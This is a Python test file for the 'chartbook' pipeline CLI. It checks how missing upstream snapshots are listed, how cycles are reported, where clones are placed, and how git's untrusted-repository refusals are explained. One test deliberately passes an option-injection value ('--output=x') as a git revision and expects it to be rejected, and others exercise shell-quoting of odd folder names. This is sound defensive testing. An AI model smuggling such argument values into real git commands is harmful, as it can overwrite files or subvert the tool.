        assert result.exit_code == 1 and "cannot be built yet" not in result.output and "git clone" not in result.output
        assert "acme/beta: cannot be pinned: " in result.output and "has no snapshot of acme/beta" in result.output

    def test_further_up_its_line_says_so_and_gives_no_command(self, work, theirs):
        listing = missing.Listing("acme/report", work, stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/beta", "a" * 40, "https://example.org/acme/rates", absent=True, read_at="a" * 40),
            missing.Wanted("acme/mid", "b" * 40, "https://example.org/acme/mid", placed=True, reads=[1]),
        ])
        said = missing.said(listing, here=work)
        assert said[3:6] == [
            "1. acme/beta at aaaaaaa    https://example.org/acme/rates, which holds no pipeline of that ID at aaaaaaa",
            "     It could not be found there, so no command is given for it.",
            "2. acme/mid at bbbbbbb    https://example.org/acme/mid; reads 1 above",
        ]

    def test_one_of_two_folders_that_give_one_id_is_the_one_its_reader_names(self, work, theirs, mine, monkeypatch):
        """A `path` entry of a pipeline in the same repository says which folder: it is not looked for by its ID."""
        # A stale copy in the folder named as the ID is: a search by ID meets it first
        top = _several(work, "mono", {"alpha": None})
        (top / "current").mkdir()
        _write(top / "current", _table("alpha"))
        _git(top, "add", "-A")
        _git(top, "commit", "--quiet", "-m", "Where it is now")
        first = _ready(top / "current", theirs)
        _ready(_added(top, "beta", {"acme/alpha": {"path": "../current"}}), theirs)
        _ready(_pipeline(work, "report", {"acme/beta": {}}), theirs)
        _away(work, "mono")
        mine()
        said = _said(_run(work, monkeypatch, "run"))
        assert _has(
            said, f"git -C {_q(work / 'mono')} checkout {first[:12]}",
            f"chartbook run --snapshot --project-dir {_q(work / 'mono' / 'current')}",
        )
        assert not any(str(work / "mono" / "alpha") in line for line in said)


class TestWhatIsNotOnIt:
    def test_a_build_of_yours_that_does_not_meet_the_pins(self, work, theirs, mine, monkeypatch):
        """It is there, and is other rows: said as it is, with `pin --update` as the way to read it. On the list it would be there for ever."""
        _ready(_pipeline(work, "mid"), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        store = mine()
        (work / "mid" / "out.csv").write_text("a,b\nother,9\n", encoding="utf-8", newline="\n")
        snapshot.make(work / "mid", store=store)
        monkeypatch.setattr(missing, "find", lambda *a, **k: pytest.fail("asked for the list"))  # nothing of it is a pipeline to build
        result = _run(work, monkeypatch, "run")
        assert result.exit_code == 1
        assert "cannot be built yet" not in result.output and "does not match the pin" in result.output
        assert "To read your build instead: chartbook pin --update acme/mid" in result.output
        assert _said(result)[-1] == "Error: acme/report: what it depends on could not be pinned. Nothing after it was run."

    def test_what_a_run_gets_from_its_repository_by_itself(self, work, theirs, mine, monkeypatch):
        """A `git` dependency is fetched and built by the run, here and in what is read on the way up."""
        _pipeline(work, "data")
        commit = _ready(_pipeline(work, "mid", {"acme/data": {"git": "../data"}}), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "mid")
        rename_when_let(work / "data", work / "elsewhere" / "data")
        mine()
        result = _run(work, monkeypatch, "run")
        assert _numbered(result) == [f"1. acme/mid at {commit[:7]}    https://example.org/acme/mid"]
        assert "not known" not in result.output  # and nothing is left unsaid of it

    def test_one_whose_pinned_files_are_all_in_a_snapshot_of_its_own(self, work, theirs, mine, monkeypatch):
        """mid pinned a file of rates, and this store has those bytes whole in another snapshot of rates, of a later commit: mid's build is handed that copy, and rates is not to build."""
        _ready(_pipeline(work, "rates"), theirs)
        commit = _ready(_pipeline(work, "mid", {"acme/rates": {}}), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        store = mine()
        (work / "rates" / "notes.txt").write_text("a note\n", encoding="utf-8", newline="\n")
        _git(work / "rates", "add", "-A")
        _git(work / "rates", "commit", "--quiet", "-m", "A note")
        snapshot.make(work / "rates", store=store)  # the same rows, at a commit the pin does not name
        _away(work, "rates", "mid")
        assert _numbered(_run(work, monkeypatch, "run")) == [f"1. acme/mid at {commit[:7]}    https://example.org/acme/mid"]

    def test_one_whose_own_copy_of_a_pinned_file_is_not_whole_is(self, work, theirs, mine, monkeypatch):
        """The same, and the file in that snapshot of rates is cut short (a sync that has not finished, say): no read is handed it, so rates is to build."""
        rates = _ready(_pipeline(work, "rates"), theirs)
        commit = _ready(_pipeline(work, "mid", {"acme/rates": {}}), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        store = mine()
        (work / "rates" / "notes.txt").write_text("a note\n", encoding="utf-8", newline="\n")
        _git(work / "rates", "add", "-A")
        _git(work / "rates", "commit", "--quiet", "-m", "A note")
        kept = Path(snapshot.make(work / "rates", store=store).snapshot.path).parent.parent / "out.csv"
        kept.chmod(0o644)
        kept.write_bytes(b"a,b\n")
        _away(work, "rates", "mid")
        assert _numbered(_run(work, monkeypatch, "run")) == [
            f"1. acme/rates at {rates[:7]}    https://example.org/acme/rates",
            f"2. acme/mid at {commit[:7]}    https://example.org/acme/mid; reads 1 above",
        ]

    def test_one_whose_pinned_files_only_another_pipeline_holds_is(self, work, theirs, mine, monkeypatch):
        """mid pinned a file of rates, and this store has those bytes only in a snapshot of another pipeline: a read of rates is never handed another pipeline's copy, so rates is to build, before mid.

        Until each snapshot held its own copy of every file, the same bytes
        anywhere in the store were read; now an asset of a pipeline is read
        from that pipeline's own snapshots alone, and the list agrees with
        the read.
        """
        rates = _ready(_pipeline(work, "rates"), theirs)
        commit = _ready(_pipeline(work, "mid", {"acme/rates": {}}), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "rates", "mid")
        store = mine()
        twin = _pipeline(work, "twin")
        (twin / "out.csv").write_text("a,b\nrates,1\n", encoding="utf-8", newline="\n")
        snapshot.make(twin, store=store)
        pinned = lock.read_lock(work / "elsewhere" / "mid").assets_of("acme/rates")
        (table,) = [record["content_hash"] for record in pinned.values() if lock.in_lockfile(record)]
        assert store.has(table) and not store.has(table, "acme/rates")  # the bytes are there, and are not rates'
        assert _numbered(_run(work, monkeypatch, "run")) == [
            f"1. acme/rates at {rates[:7]}    https://example.org/acme/rates",
            f"2. acme/mid at {commit[:7]}    https://example.org/acme/mid; reads 1 above",
        ]

    def test_what_a_pin_takes_or_gets_by_itself(self, work, theirs, monkeypatch):
        """Asked of each dependency by itself: a folder with a snapshot, a revision its repository is asked for, an ID with a host to clone it from."""
        _ready(_pipeline(work, "made"), theirs)
        _pipeline(work, "unmade")
        report = _pipeline(work, "report", {
            "acme/made": {"path": "../made"}, "acme/unmade": {"path": "../unmade"},
            "acme/by-rev": {"rev": "main"}, "acme/nowhere": {},
        })
        found = missing.find(report, theirs)
        assert [(line.pipeline, line.folder, line.by_path) for line in found.wanted] == [
            ("acme/nowhere", None, False), ("acme/unmade", work / "unmade", True),
        ]
        assert found.keys == {"acme/nowhere", "acme/unmade"}
        # Only what it is asked of
        assert [line.pipeline for line in missing.find(report, theirs, only={"acme/unmade"}).wanted] == ["acme/unmade"]
        # With a host to clone it from, the run gets acme/nowhere from its repository
        monkeypatch.setattr(config, "get_default_host", lambda: "example.org")
        assert [line.pipeline for line in missing.find(report, theirs).wanted] == ["acme/unmade"]

    def test_an_id_the_store_has_in_other_letters(self, work, theirs, monkeypatch):
        """A name to put right, as the pin says: nothing to build."""
        _ready(_pipeline(work, "mid"), theirs)
        _pipeline(work, "report", {"Acme/Mid": {}})
        result = _run(work, monkeypatch, "run")
        assert "cannot be built yet" not in result.output and "Did you mean acme/mid?" in result.output

    def test_a_pipeline_that_names_itself(self, work, theirs, monkeypatch):
        """Said by its pin and by its run: nothing for the list to hold, or to call a cycle of its own finding."""
        report = _pipeline(work, "report", {"acme/report": {}})
        assert missing.find(report, theirs).wanted == []

    def test_one_with_nothing_of_it_in_the_lockfile_is(self, work, theirs, mine, monkeypatch):
        """Its entry is the pin, of a snapshot that is not here: what reads it cannot be built without it."""
        commit = _ready(_pipeline(work, "rates"), theirs)
        mid = _pipeline(work, "mid", {"acme/rates": {}})
        _ready(mid, theirs)
        document = json.loads((mid / lock.LOCK_FILE).read_text(encoding="utf-8"))
        document["records"] = [record for record in document["records"] if record.get("kind") == "Pipeline"]
        document["records"][0]["dependencies"][0].pop("pinned_hash", None)
        (mid / lock.LOCK_FILE).write_text(json.dumps(document), encoding="utf-8", newline="\n")
        _git(mid, "commit", "--quiet", "-am", "Pinned by its entry alone")
        (mid / "out.csv").write_text("a,b\nmid,1\n", encoding="utf-8", newline="\n")
        snapshot.make(mid, store=theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}}), theirs)
        _away(work, "rates", "mid")
        mine()
        assert _numbered(_run(work, monkeypatch, "run"))[0] == f"1. acme/rates at {commit[:7]}    https://example.org/acme/rates"

    def test_with_other_things_that_could_not_be_pinned_both_are_said(self, work, theirs, mine, monkeypatch):
        _ready(_pipeline(work, "mid"), theirs)
        _ready(_pipeline(work, "other"), theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {}, "acme/other": {}}), theirs)
        _away(work, "mid")
        store = mine()
        (work / "other" / "out.csv").write_text("a,b\nelse,9\n", encoding="utf-8", newline="\n")
        snapshot.make(work / "other", store=store)
        said = _said(_run(work, monkeypatch, "run"))
        assert _head(work, "1 pipeline it reads is") in said
        assert any(line.startswith("acme/other: ") for line in said) and not any(line.startswith("acme/mid: ") for line in said)
        assert said[-1] == "Error: acme/report: what it depends on could not be pinned. Nothing after it was run."
        pinned = _said(_run(work, monkeypatch, "pin"))
        assert _head(work, "1 pipeline it reads is", done="pinned") in pinned
        assert pinned[-1] == "1 other thing(s) could not be pinned."


class TestUpstream:
    """`chartbook run --upstream` is offered where it would build all of the list, and only there."""

    OFFER = "Or `chartbook run --upstream` here, which builds and snapshots {} itself."

    def test_it_is_offered_for_folders_that_were_never_pinned(self, work, theirs, monkeypatch):
        _pipeline(work, "rates")
        _pipeline(work, "mid", {"acme/rates": {"path": "../rates"}})
        _pipeline(work, "report", {"acme/mid": {"path": "../mid"}})
        result = _run(work, monkeypatch, "run")
        assert self.OFFER.format("these folders") in _said(result)
        # And it does: the same run with it builds them, and this one
        monkeypatch.setenv("CHARTBOOK_TRUST", "all")
        for name in ("mid", "report"):
            _git(work / name, "add", "-A")
            _git(work / name, "commit", "--quiet", "--allow-empty", "-m", "Its lockfile")
        again = _run(work, monkeypatch, "run", "--upstream")
        assert again.exit_code == 0, again.output

    def test_not_where_a_folder_on_the_list_is_one_that_another_pins(self, work, theirs, mine, monkeypatch):
        """rates is read with no pin, and zed pins it at the commit it is on: one line, of a pinned build, which `--upstream` is not offered for."""
        commit = _ready(_pipeline(work, "rates"), theirs)
        zed = _pipeline(work, "zed", {"acme/rates": {"path": "../rates"}})
        assert not lock.pin(zed, theirs).problems
        _git(zed, "add", "-A")
        _git(zed, "commit", "--quiet", "-m", "The lockfile")
        _pipeline(work, "report", {"acme/rates": {"path": "../rates"}, "acme/zed": {"path": "../zed"}})
        mine()
        result = _run(work, monkeypatch, "run")
        assert _numbered(result) == [
            f"1. acme/rates at {commit[:7]}    {_up('rates')} (a folder on this machine)",
            f"2. acme/zed    {_up('zed')} (a folder on this machine); reads 1 above",
        ]
        assert "chartbook run --upstream" not in result.output

    def test_not_for_a_clone_of_one_named_by_its_id(self, work, theirs, monkeypatch):
        """Found by review: it was offered, and `--upstream`, which builds `path` entries, printed the same list again."""
        _pipeline(work, "mid")
        _pipeline(work, "report", {"acme/mid": {"repository": "https://example.org/acme/mid"}})
        result = _run(work, monkeypatch, "run")
        assert f"1. acme/mid    {_up('mid')} (a clone of https://example.org/acme/mid)" in _said(result)
        assert "--upstream" not in result.output

    def test_not_where_a_folder_reads_what_it_could_not_build(self, work, theirs, monkeypatch):
        """Found by review: offered for "these folders", and `--upstream` stopped at the one named by its ID."""
        _pipeline(work, "mid", {"acme/rates": {}})
        _pipeline(work, "report", {"acme/mid": {"path": "../mid"}})
        result = _run(work, monkeypatch, "run")
        assert len(_numbered(result)) == 2 and "--upstream" not in result.output

    def test_not_for_one_with_no_build_script(self, work, theirs, monkeypatch):
        _pipeline(work, "rates", builds=False)
        _pipeline(work, "report", {"acme/rates": {"path": "../rates"}})
        assert "--upstream" not in _run(work, monkeypatch, "run").output

    def test_an_upstream_that_cannot_be_pinned_is_said_as_before(self, work, theirs, monkeypatch):
        """The list is for the pipeline that was asked for: an upstream's own pin says what it lacks."""
        _pipeline(work, "mid", {"acme/rates": {}})
        _pipeline(work, "report", {"acme/mid": {"path": "../mid"}})
        monkeypatch.setenv("CHARTBOOK_TRUST", "all")
        result = _run(work, monkeypatch, "run", "--upstream")
        assert result.exit_code == 1 and "cannot be built yet" not in result.output
        assert "has no snapshot of acme/rates" in result.output


class TestNoOrder:
    def _a_cycle(self, work, theirs) -> Path:
        """mid, which is not in the store, read this pipeline when it was built: there is no order to build the two in."""
        _ready(_pipeline(work, "report"), theirs)
        _ready(_pipeline(work, "mid", {"acme/report": {}}), theirs)
        report = work / "report"
        _write(report, _table("report", {"acme/mid": {}}))
        # Its lockfile, as a machine that could not see the cycle wrote it
        entry = json.loads((work / "mid" / lock.LOCK_FILE).read_text(encoding="utf-8"))
        mid = next(taken for taken in snapshot.readable_snapshots(theirs)[0] if taken.pipeline == "acme/mid")
        entry["root"] = "acme/report"
        entry["records"][0]["id"] = "acme/report"
        entry["records"][0]["dependencies"] = [{
            "id": "acme/mid", "via": "store", "snapshot": mid.made_at, "pinned_from": "acme/mid",
            "location": {"kind": "store", "pipeline": "acme/mid", "commit": mid.commit, "repository": "https://example.org/acme/mid"},
        }]
        entry["records"] = [entry["records"][0], {
            **entry["records"][1], "id": "acme/mid:out", "pipeline": "acme/mid",
            "ref": {"scope": "acme", "pipeline": "mid", "kind": "dataframe", "name": "out"},
        }]
        (report / lock.LOCK_FILE).write_text(json.dumps(entry), encoding="utf-8", newline="\n")
        _git(report, "add", "-A")
        _git(report, "commit", "--quiet", "-m", "Reads mid")
        _away(work, "mid")
        return report

    def test_a_cycle_is_an_error_in_the_words_a_run_has_for_one(self, work, theirs, mine, monkeypatch):
        report = self._a_cycle(work, theirs)
        mine()
        result = _run(work, monkeypatch, "run")
        assert result.exit_code == 1
        said = _said(result)
        assert NO_ORDER in said
        assert f"  acme/report depends on acme/mid: declared in {report / 'chartbook.toml'}" in said
        assert any(line.startswith("  acme/mid depends on acme/report: declared in chartbook.toml of https://example.org/acme/mid at ") for line in said)
        assert "cannot be built yet" not in result.output and not (report / "build.log").exists()
        pinned = _run(work, monkeypatch, "pin")
        assert pinned.exit_code == 1 and NO_ORDER in _said(pinned)

    def test_add_says_it_and_undoes_nothing(self, work, theirs, mine, monkeypatch):
        """Found by review: an entry that had no part in the cycle was taken out of the manifest again, with its pin left in the lockfile."""
        report = self._a_cycle(work, theirs)
        _ready(_pipeline(work, "rates"), theirs)
        store = mine()
        (work / "rates" / "out.csv").write_text("a,b\nrates,1\n", encoding="utf-8", newline="\n")
        snapshot.make(work / "rates", store=store)
        result = _run(work, monkeypatch, "add", "acme/rates")
        assert result.exit_code == 1 and NO_ORDER in _said(result)
        assert "acme/rates: 1 pinned" in _said(result)
        declared = (report / "chartbook.toml").read_text(encoding="utf-8")
        assert '"acme/rates"' in declared and "was not added" not in result.output
        assert "acme/rates:out" in lock.read_lock(report).assets


class TestTheOtherCommands:
    def test_pin_makes_the_list_too(self, work, theirs, mine, monkeypatch):
        commits = _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        result = _run(work, monkeypatch, "pin")
        assert result.exit_code == 1
        said = _said(result)
        assert said[2] == _head(work, "2 pipelines it reads are", done="pinned")
        assert said[-3:] == ["Then here again:", f"     chartbook pin --project-dir {_q(work / 'report')}", SHARED.format("them")]
        assert f"2. acme/mid at {commits['mid'][:7]}    https://example.org/acme/mid; reads 1 above" in said
        assert not any("could not be pinned" in line or line.startswith("acme/mid:") or "is unchanged" in line for line in said)

    def test_pin_still_says_what_it_wrote(self, work, theirs, mine, monkeypatch):
        """Found by review: with everything on the list the pin's report was left out whole, and with it that `chartbook.toml` had been rewritten."""
        _ready(_pipeline(work, "mid"), theirs)
        report = _pipeline(work, "report", {"acme/mid": {}})
        _ready(report, theirs)
        table = _table("report", {"acme/mid": {}})
        table["project"]["requires_chartbook"] = ">=0.3.0"
        _write(report, table)
        _git(report, "commit", "--quiet", "-am", "Admits a ChartBook that cannot read this lockfile")
        _away(work, "mid")
        mine()
        result = _run(work, monkeypatch, "pin")
        assert _head(work, "1 pipeline it reads is", done="pinned") in _said(result)
        assert "requires_chartbook" in (report / "chartbook.toml").read_text(encoding="utf-8")
        assert any("requires_chartbook is now" in line and '(it was ">=0.3.0")' in line for line in _said(result))

    def test_an_update_does_not(self, work, theirs, mine, monkeypatch):
        """It asks for the newest of each, which is not the commit a pin names: said as before."""
        _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        result = _run(work, monkeypatch, "pin", "--update")
        assert result.exit_code == 1 and "cannot be pinned yet" not in result.output and "Fetching" not in result.output
        assert "acme/mid: cannot be pinned: " in result.output

    @pytest.mark.parametrize("words", [["pin", "--check"], ["run", "--frozen"]])
    def test_the_checks_that_fetch_nothing_say_where_the_list_is(self, work, theirs, mine, monkeypatch, words):
        _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        monkeypatch.setattr(GitCache, "fetch", lambda *a, **k: pytest.fail("fetched"))
        result = _run(work, monkeypatch, *words)
        assert result.exit_code == 1
        assert "  What it reads in turn may not be in the store either: `chartbook run` lists all there is to build, in order." in _said(result)
        assert "cannot be built yet" not in result.output

    def test_in_python_the_run_reports_it(self, work, theirs, mine, monkeypatch):
        from chartbook import run

        commits = _chain(work, theirs)
        _away(work, "rates", "mid")
        mine()
        report = run.run(work / "report", echo=lambda line: None)
        assert report.failed is not None and report.reason == run.NOT_IN_STORE
        listing = report.not_in_store
        assert [(line.pipeline, line.commit, line.repository, line.reads) for line in listing.wanted] == [
            ("acme/rates", commits["rates"], "https://example.org/acme/rates", []),
            ("acme/mid", commits["mid"], "https://example.org/acme/mid", [1]),
        ]
        assert listing.keys == {"acme/mid"} and listing.root == "acme/report" and listing.stores == [str(work / "mine")]


class TestWhereAClonGoes:
    def test_every_name_the_list_may_give_a_clone_is_looked_at_the_next_time(self, work):
        """Found by the third pass: with nine names taken it said `NAME-clone`, and did not know that clone afterwards."""
        names = missing._clone_folders(work, "mid")
        assert names[0] == work / "mid" and names[1] == work / "mid-2" and names[-1] == work / "mid-clone" and len(names) == 10

    def test_beside_the_pipelines_own_repository(self, work, theirs):
        report = _pipeline(work, "report", within="pipelines/report")
        assert missing._beside(report) == work

    def test_never_above_the_home_folder(self, work, theirs, monkeypatch):
        """Found by review: with the home folder under git (settings kept there), beside the repository was above home."""
        home = work / "home"
        (home / "projects" / "report").mkdir(parents=True)
        _write(home / "projects" / "report", _table("report"))
        _repository(home, "")
        monkeypatch.setattr(Path, "home", lambda: home)
        assert missing._beside(home / "projects" / "report") == home / "projects"


class TestFilesAtACommit:
    """What the git cache reads of a commit, with nothing checked out."""

    def test_the_paths_of_a_name_and_the_text_of_one(self, work, theirs):
        top = _pipeline(work, "mid", within="pipelines/mid").parent.parent
        (top / "chartbook.toml").write_text("[project]\n", encoding="utf-8", newline="\n")
        (top / "not-chartbook.toml").write_text("", encoding="utf-8", newline="\n")
        _git(top, "add", "-A")
        _git(top, "commit", "--quiet", "-m", "Two of them")
        commit = _git(top, "rev-parse", "HEAD")
        cache = GitCache(work / "git-cache")
        cache.fetch(str(top))
        assert cache.paths_at(str(top), commit, "chartbook.toml") == ["chartbook.toml", "pipelines/mid/chartbook.toml"]
        assert cache.text_at(str(top), commit, "chartbook.toml") == "[project]\n"
        assert cache.text_at(str(top), commit, "chartbook.lock") is None
        assert not (work / "git-cache" / "checkouts").exists()
        with pytest.raises(ValueError):
            cache.text_at(str(top), "--output=x", "chartbook.toml")
        with pytest.raises(ValueError):
            cache.paths_at(str(top), "HEAD", "chartbook.toml")


#: What git says of a repository another user owns, and on Windows of any on a network share; it ends 128
DUBIOUS = (
    "fatal: detected dubious ownership in repository at '{at}'\n"
    "To add an exception for this directory, call:\n"
    "\n"
    "\tgit config --global --add safe.directory {at}"
)
NOT_TRUSTED = (
    "git does not trust the repository that {folder} is in ({at}): another user owns it, or it is on a network share, "
    "and git reads no such repository until it is told to. To have git trust it, run `git config --global --add "
    "safe.directory {typed}`, and then this again"
)


def _git_as_it_was(directory: Path) -> str:
    """The commit a folder is at, asked of git itself: before a test has git refuse the folder."""
    return subprocess.run(
        ["git", "-C", str(directory), "rev-parse", "HEAD"], capture_output=True, text=True, check=True
    ).stdout.strip()


def _git_refuses(monkeypatch, words: str, under: Path) -> None:
    """Git fails with *words* wherever it is run in *under*, as ``snapshot._git`` raises what git said; elsewhere it runs."""
    real = snapshot._git

    def refuse(directory, *arguments, **options):
        if Path(directory) == under or under in Path(directory).parents:
            raise snapshot.SnapshotError(words)
        return real(directory, *arguments, **options)

    monkeypatch.setattr(snapshot, "_git", refuse)


class TestAFolderGitWillNotRead:
    """The list said "… is not in a git repository" of every folder ``snapshot.code_of`` refused: one in a
    repository git does not trust, which on Windows is any on a network share, and one on a machine where
    git could not be run. Neither was so, and neither left anything to do.

    Found by the review of ``code_of``'s own change, 2026-11-20. Each line is now what the folder's own
    commands say.
    """

    @pytest.fixture
    def mid(self, work, theirs, mine):
        """report pins mid, a ``path`` dependency, at a commit; and mid is not in this machine's store."""
        mid = _pipeline(work, "mid")
        _ready(mid, theirs)
        _ready(_pipeline(work, "report", {"acme/mid": {"path": "../mid"}}), theirs)
        mine()
        return mid

    #: What a line says under the command that makes git trust its repository
    TOLD = (
        "     Git does not trust the repository it is in, and reads nothing of it until the command above has been "
        "typed. How to build it is said after that, by the last command here."
    )
    #: And the list's second line then
    NOT_WHOLE = (
        "Git does not trust a repository below, and reads nothing of it, so how to build what is in it is not known yet. "
        "Type the commands below, one at a time: the last one then says the rest."
    )

    def test_its_line_is_the_command_that_makes_git_trust_it_and_no_other(self, work, mid, monkeypatch):
        """Found on Windows, on a share, by typing the list's lines in their order: the list says "one at a
        time", git refused the first of them, and the command that would have let it run was at the end of
        the line's third, inside a sentence that began with something else. And by the review of putting
        that command first: the commands under it had been made with nothing read of the repository, and
        then ran."""
        at = mid.as_posix()  # as git writes a folder, on Windows too
        _git_refuses(monkeypatch, DUBIOUS.format(at=at), under=mid)
        result = _run(work, monkeypatch, "run")
        said = _said(result)
        assert not any("is not in a git repository" in line for line in said), said
        assert said[1] == self.NOT_WHOLE
        assert said[3:8] == [
            f"1. acme/mid at {_git_as_it_was(mid)[:7]}    {_up('mid')} (a folder on this machine)",
            f"     git config --global --add safe.directory {missing._quoted(at, batch=False)}",
            self.TOLD,
            "",
            "Then here again:",
        ], said
        assert said[8] == f"     chartbook run --project-dir {_q(work / 'report')}"  # which then says how to build it
        assert not any("checkout" in line or "--snapshot" in line for line in said), said

    def test_no_command_is_made_blind_in_the_pipelines_own_repository(self, work, theirs, mine, monkeypatch):
        """Found by the review, by typing it with git's own refusal: one repository holds both, `report`
        pins `mid` at a commit before its own, and git reads nothing of the repository. With the trust
        command put first, the list's `git -C …/mono/mid checkout COMMIT` ran once git trusted it, left
        the pipeline's own repository on no branch, and `report` was built from the old commit's files. A
        list made with what git says gives a worktree there, and moves nothing."""
        top = _several(work, "mono", {"mid": None})
        _ready(top / "mid", theirs)
        report = _added(top, "report", {"acme/mid": {"path": "../mid"}})
        _ready(report, theirs)
        mine()
        _git_refuses(monkeypatch, DUBIOUS.format(at=top.as_posix()), under=top)
        said = _said(_run(work, monkeypatch, "run", where="mono/report"))
        assert f"     git config --global --add safe.directory {missing._quoted(top.as_posix(), batch=False)}" in said, said
        assert self.TOLD in said
        assert not any(line.strip().startswith(("git -C", "chartbook run --snapshot", "chartbook snapshot")) for line in said), said

    def test_the_command_is_given_once_for_two_folders_of_one_repository(self, work):
        trust = "git config --global --add safe.directory /srv/mono"
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/a", "c" * 40, folder=work / "mono" / "a", not_trusted="git does not trust …", trust=trust),
            missing.Wanted("acme/b", "c" * 40, folder=work / "mono" / "b", not_trusted="git does not trust …", trust=trust),
        ])
        said = missing.said(listing, here=work / "report")
        assert said[3:7] == [
            f"1. acme/a at ccccccc    {_up(os.path.join('mono', 'a'))} (a folder on this machine)",
            f"     {trust}",
            self.TOLD,
            f"2. acme/b at ccccccc    {_up(os.path.join('mono', 'b'))} (a folder on this machine)",
        ]
        assert said[7] == (
            "     It is in the repository that the command of line 1 makes git trust. How to build it is said after that, "
            "by the last command here."
        )
        assert sum("safe.directory" in line for line in said) == 1

    def test_one_that_was_never_pinned_is_told_the_same(self, work):
        """Found by the review: it got the command and no word of why. Reached only further down a list; the one a pipeline reads itself is refused by its pin."""
        trust = "git config --global --add safe.directory /srv/mid"
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/mid", None, folder=work / "mid", not_trusted="git does not trust …", trust=trust),
        ])
        said = missing.said(listing, here=work / "report")
        assert said[3:6] == [f"1. acme/mid    {_up('mid')} (a folder on this machine)", f"     {trust}", self.TOLD]

    def test_on_windows_the_command_is_given_where_the_folders_own_name_would_give_none(self, work):
        """Found by the review: a folder named `R&D` is given no command on Windows, and the line that
        replaced its commands replaced the one that makes git trust its repository too. That one names
        the repository, in a word quoted for git, and is the only command its line has."""
        trust = 'git config --global --add safe.directory "%(prefix)///fileserver/home/mid"'
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/mid", "c" * 40, folder=work / "mid" / "R&D", not_trusted="git does not trust …", trust=trust),
        ])
        said = missing.said(listing, here=work / "report", windows=True)
        assert said[4:6] == [f"     {trust}", self.TOLD]
        assert not any("No command is given" in line for line in said)

    def test_where_there_is_no_command_to_give_its_line_is_the_sentence(self, work):
        """On Windows, a repository whose name holds what a shell reads: the sentence says where git's own command is."""
        sentence = (
            "git does not trust the repository that C:/x is in (//server/share/a`b): another user owns it, or it is on a "
            "network share, and git reads no such repository until it is told to. To have git trust it, run the `git "
            "config --global --add safe.directory` command that `git status` prints in that folder (in PowerShell or "
            "Git Bash: `cmd.exe` does not read its quotes), and then this again"
        )
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/mid", "c" * 40, folder=work / "mid", not_trusted=sentence),
        ])
        said = missing.said(listing, here=work / "report", windows=True)
        assert said[1] == self.NOT_WHOLE
        assert said[4] == f"     How to build it is not known: {sentence}."
        assert said[5] == "" and not any(line.strip().startswith("git ") for line in said)

    def test_a_list_with_no_such_folder_begins_as_it_did(self, work):
        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
            missing.Wanted("acme/mid", "c" * 40, folder=work / "mid"),
        ])
        assert missing.said(listing, here=work / "report")[1] == (
            "Build it first, with the commands below, one at a time. They end with a snapshot, which is what this one reads."
        )

    def test_one_that_was_never_pinned_is_refused_by_its_pin_which_says_the_command(self, work, theirs, mine, monkeypatch):
        """It never reaches the list: the pin of it is what fails, with the folder's own sentence."""
        mid = _pipeline(work, "mid")
        _pipeline(work, "report", {"acme/mid": {"path": "../mid"}})
        mine()
        at = mid.as_posix()
        _git_refuses(monkeypatch, DUBIOUS.format(at=at), under=mid)
        said = _said(_run(work, monkeypatch, "run"))
        assert any(
            line.startswith("acme/mid: cannot be pinned: git does not trust the repository that ")
            and f"run `git config --global --add safe.directory {missing._quoted(at, batch=False)}`, and then this again" in line
            for line in said
        ), said

    def test_the_sentence_is_said_whole_and_not_cut(self, work, mid, monkeypatch):
        """Where there is no command to give, the sentence says where git's own is. A line of the list
        holds 300 characters of what a file gave; this one is the folder's own commands' sentence, and
        holds 4,096."""
        sentence = (
            f"git does not trust the repository that {mid} is in ({'m' * 400}): another user owns it, or it is on a "
            "network share, and git reads no such repository until it is told to. To have git trust it, run the `git "
            "config --global --add safe.directory` command that `git status` prints in that folder (in PowerShell or "
            "Git Bash: `cmd.exe` does not read its quotes), and then this again"
        )

        def refuse(directory):
            raise snapshot.RepositoryNotTrusted(sentence)  # with no command

        monkeypatch.setattr(snapshot, "code_of", refuse)
        said = _said(_run(work, monkeypatch, "run"))
        assert f"     How to build it is not known: {sentence}." in said, said
        assert not any(line.strip().startswith("git config") for line in said)

    def test_git_that_could_not_be_run_is_said_so(self, work, mid, monkeypatch):
        _git_refuses(monkeypatch, f"{snapshot._GIT_NOT_RUN}: [Errno 2] No such file or directory: 'git'", under=mid)
        said = _said(_run(work, monkeypatch, "run"))
        assert (
            "     What it reads in turn is not known: git could not be run: [Errno 2] No such file or directory: 'git'. "
            "Its own `chartbook run` says."
        ) in said, said

    def test_a_folder_that_is_in_no_repository_is_still_said_to_be_in_none(self, work, mid, monkeypatch):
        _git_refuses(monkeypatch, "fatal: not a git repository (or any of the parent directories): .git", under=mid)
        said = _said(_run(work, monkeypatch, "run"))
        # In the list's own words, as before: what a snapshot is does not belong in a line of it
        assert f"     What it reads in turn is not known: {mid} is not in a git repository. Its own `chartbook run` says." in said, said

    @pytest.mark.parametrize("words", [
        "the repository at {mid} has no commit yet",
        "{mid} is not under /srv/elsewhere, which is the top of its repository as git gives it, so where the folder is in its repository cannot be told",
    ])
    def test_every_other_thing_code_of_says_is_said_whole(self, work, mid, monkeypatch, words):
        """Read: each of ``code_of``'s other sentences is one line, and right between the list's words."""
        def refuse(directory):
            raise snapshot.SnapshotError(words.format(mid=mid))

        monkeypatch.setattr(snapshot, "code_of", refuse)
        said = _said(_run(work, monkeypatch, "run"))
        assert f"     What it reads in turn is not known: {words.format(mid=mid)}. Its own `chartbook run` says." in said, said
